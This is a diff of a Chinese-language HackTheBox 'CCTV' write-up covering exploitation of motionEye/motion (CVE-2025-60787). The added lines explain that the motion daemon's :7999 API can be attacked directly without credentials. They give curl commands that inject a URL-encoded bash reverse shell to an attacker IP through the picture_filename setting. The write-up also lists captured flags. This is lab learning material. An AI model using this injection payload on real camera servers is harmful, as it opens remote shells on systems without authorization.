@@ -160,7 +160,7 @@ $ ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
 另外根據motion官方的page([motion project](https://motion-project.github.io/))
 > Motion is a highly configurable program that monitor video signals from many types of cameras and depending upon how they are configured, perform actions when movement is detected.
 
-總之就是和monitor相關的監控服務，一樣先看有沒有對應的CVE，目前motioneye的版本為`0.43.1b4`，在motioneye的登入畫面source code可以看到，然後可以對應到[CVE-2025-60787](https://nvd.nist.gov/vuln/detail/CVE-2025-60787)，並且看了一下發現的網友的wp: [MotionEye RCE via Client-Side Validation Bypass](https://github.com/prabhatverma47/motionEye-RCE-through-config-parameter?tab=readme-ov-file)，但是這是一個需要motioneye的帳號密碼
+也就是說，motioneye是一個前端的console介面，實際在後端運行camera daemon的是motion，而如果是只有motioneye的話應該只會有`:8765`，但看到有`:7999`那就代表HTB已經先幫我們註冊了一個camera，所以才會跑motion daemon，這個在後面會很重要，一樣先看有沒有對應的CVE，目前motioneye的版本為`0.43.1b4`，在motioneye的登入畫面source code可以看到，然後可以對應到[CVE-2025-60787](https://nvd.nist.gov/vuln/detail/CVE-2025-60787)，並且看了一下發現的網友的wp: [MotionEye RCE via Client-Side Validation Bypass](https://github.com/prabhatverma47/motionEye-RCE-through-config-parameter?tab=readme-ov-file)，但是這是一個需要motioneye的帳號密碼
 
 通常motioneye的config會寫在`/etc/motioneye/motion.conf`
 ```bash
@@ -221,3 +221,10 @@ cat /home/sa_mark/user.txt
 
 * User Flag: `2678adb968a3f49e749f876ef4092e81`
 * Root Flag: `2cac047cd0eb7335f4b212531260cf5d`
+
+最後的這個攻擊之所以會成功是因為HTB已經先幫我們註冊了一個camera daemon，讓poc可以針對這個daemon做一些api上的command injection操作，如果是沒有註冊任何camera daemon，在poc打payload之前就會報error，畢竟poc真正在打的是`:7999`這個服務，換言之，既然都是直接打`:7999`這個服務，那是不是就沒必要得到motioneye的帳密呢?我只要針對`:7999`送query就好啦，詳情可以看[【滲透測試】HTB Season 10 CCTV 全過程WP ](https://www.cnblogs.com/DSchenzi/p/19708211)
+```bash
+$ curl "http://127.0.0.1:7999/1/1config/set?picture_output=on"
+$ curl "http://127.0.0.1:7999/1/config/set?picture_filename=%24%28bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.14%2F4444%200%3E%261%27%29"
+$ curl "http://127.0.0.1:7999/1/config/set?emulate_motion=on"
+```
